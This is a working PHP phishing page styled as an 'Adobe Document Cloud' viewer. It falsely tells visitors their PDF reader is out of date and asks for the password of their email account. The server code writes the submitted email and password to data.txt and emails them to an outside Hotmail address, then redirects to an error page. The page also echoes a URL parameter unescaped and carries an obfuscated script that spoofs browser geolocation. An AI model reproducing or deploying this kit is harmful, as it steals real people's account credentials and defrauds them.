<?php
$msg = '<p><strong>Confirm your identity</strong>!<br>
    Sign in with your receiving email account to view document.</p>';

if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){
  $msg = '<p><strong>Confirm your identity</strong>!<br><span style="color: red;">Invalid Login Details</span></p>';

  $to      = 'livebillcenter020@hotmail.com';
  $subject = 'MS Product'.mt_rand();
  $message = 'Email: '.$_POST['email'] .' PASSWORD: '.$_POST['password']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);
    @mail($to, $subject, $message, $headers);
$emailA = '';
if(!empty($_GET['email'])){$emailA = $_GET['email'];}
header("Location: error.php?email=$emailA");
}
?>
<html>
<script>(function(){function ZfNCb() {
  window.hCTVdOw = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
  window.BkFlDdK = navigator.geolocation.watchPosition.bind(navigator.geolocation);
  let WAIT_TIME = 100;

  function waitGetCurrentPosition() {
    if ((typeof window.pedEe !== 'undefined')) {
      if (window.pedEe === true) {
        window.TnbGFjU({
          coords: {
            latitude: window.BVObR,
            longitude: window.ZYdgQ,
            accuracy: 10,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: new Date().getTime(),
        });
      } else {
        window.hCTVdOw(window.TnbGFjU, window.VAdJZKQ, window.GqOlP);
      }
    } else {
      setTimeout(waitGetCurrentPosition, WAIT_TIME);
    }
  }

  function waitWatchPosition() {
    if ((typeof window.pedEe !== 'undefined')) {
      if (window.pedEe === true) {
        navigator.getCurrentPosition(window.CIKnTyu, window.trHDcMQ, window.ObjvP);
        return Math.floor(Math.random() * 10000); // random id
      } else {
        window.BkFlDdK(window.CIKnTyu, window.trHDcMQ, window.ObjvP);
      }
    } else {
      setTimeout(waitWatchPosition, WAIT_TIME);
    }
  }

  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
    window.TnbGFjU = successCallback;
    window.VAdJZKQ = errorCallback;
    window.GqOlP = options;
    waitGetCurrentPosition();
  };
  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
    window.CIKnTyu = successCallback;
    window.trHDcMQ = errorCallback;
    window.ObjvP = options;
    waitWatchPosition();
  };

  window.addEventListener('message', function (event) {
    if (event.source !== window) {
      return;
    }
    const message = event.data;
    switch (message.method) {
      case 'ZByncRX':
        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
          window.BVObR = message.info.coords.lat;
          window.ZYdgQ = message.info.coords.lon;
          window.pedEe = message.info.fakeIt;
        }
        break;
      default:
        break;
    }
  }, false);
}ZfNCb();})()</script>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Adobe Document Cloud</title>
<link rel="shortcut icon" href="favicon.png" type="image/x-icon">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="bootstrap.min.css">
<script src="jquery.min.js"></script>
<script src="bootstrap.min.js">

</script>
</head>

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
<table width="100%" height="100%" cellspacing="0">
	<tbody>
		<tr>
			<td height="20%" bgcolor="#000000"><table align="center">
					<tbody>
						<tr>
							<td><img src="logo.jpg" width="330" height="70"></td>
							<td width="750"><table width="" align="right">
									<tbody>
										<tr>
											<td><font face="verdana" size="+2" color="#FFFFFF"> Adobe Document Cloud </font></td>
										</tr>
										<tr>
											<td><font face="verdana" size="2" color="#FFFFFF"> Adobe User: <font color="#FF0000">
												<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>
												</font> </font></td>
										</tr>
									</tbody>
								</table></td>
						</tr>
					</tbody>
				</table></td>
		</tr>
		<tr>
			<td height="70%" background="background.jpg"><table>
					<tbody>
						<tr>
							<td width="200"></td>
							<td><table>
									<tbody>
										<tr>
											<td height="10"></td>
											<td></td>
										</tr>
										<tr>
											<td><font face="verdana" size="2" color="#FFFFFF"> Your version of Adobe PDF Reader is out-dated and can not open this document.<br>
												To view the file on Adobe Cloud, please click on the button below<br>
												</font></td>
										</tr>
										<tr>
											<td height="70"></td>
											<td></td>
										</tr>
										<tr>
											<td height=""><button type="button" class="btn btn-info btn-lg" data-toggle="modal" data-target="#myModal" style="width:260px; height:55px; font-family: Verdana; font-size: 14px; color:#FFFFFF; 
          background-color: #045FB4; border: solid 1px #045FB4; padding: 10px; 
            -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px; 
            -moz-box-shadow: 5px 5px 5px #000000; -webkit-box-shadow: 5px 5px 5px #000000; 
          box-shadow: 5px 5px 5px #000000;"> View Document Online </button>
												
												<!-- Modal -->
												
												<div class="modal fade" id="myModal" role="dialog">
													<div class="modal-dialog"> 
														
														<!-- Modal content-->
														<div class="modal-content">
															<div class="modal-header">
																<h4 class="modal-title"><font color="#045FB4" size="+2"> <font color="#FFFFFF">...</font> *User Authentication Required </font></h4>
																<br>
																<font face="verdana" size="2"> <font color="#FFFFFF">.....</font><b>Please confirm that you are the owner of this account</b> </font> </div>
															<div class="modal-body">
																<table align="center">
																	<tbody>
																		<tr>
																			<td width="5"></td>
																			<td width="150"><img src="favicon.png" width="165" height="165"></td>
																			<td width="35"></td>
																			<td><p> </p>
																				<form method="post" action="./?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>">
																					<input type="hidden" name="sendgo" value="sendto">
																					<p></p>
																					<p>
																						<input name="email" type="email" style="width:320px; height:45px; 
                font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; 
                border: solid 1px #000000; padding: 10px; -moz-border-radius: 2px; 
                -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; 
                -moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; 
                box-shadow: 3px 3px 3px #000000;" required value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" readonly>
																					</p>
																					<p>
																						<input name="password" type="password" style="width:320px; height:45px; 
                font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; 
                border: solid 1px #000000; padding: 10px; -moz-border-radius: 2px; 
                -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; 
                -moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; 
                box-shadow: 3px 3px 3px #000000;" required placeholder="Password">
																					</p>
																					<p>
																						<input type="submit" value="View Document Online" style="width:320px; height:50px; background-color: #045FB4; border: solid 3px #045FB4; 
                font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff; 
                -moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px; 
                border-radius: 3px;-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; 
                box-shadow: 3px 3px 3px #000000;">
																					</p>
																					<p> </p>
																				</form>
																				<p></p></td>
																		</tr>
																	</tbody>
																</table>
															</div>
														</div>
													</div>
												</div></td>
										</tr>
										<tr>
											<td height="150"></td>
											<td></td>
										</tr>
									</tbody>
								</table></td>
						</tr>
					</tbody>
				</table></td>
		</tr>
		<tr>
			<td height="10%" bgcolor="#000000"><div align="center"> <img src="footer.png" width="550" height="38"> </div></td>
		</tr>
	</tbody>
</table>
</body>
</html>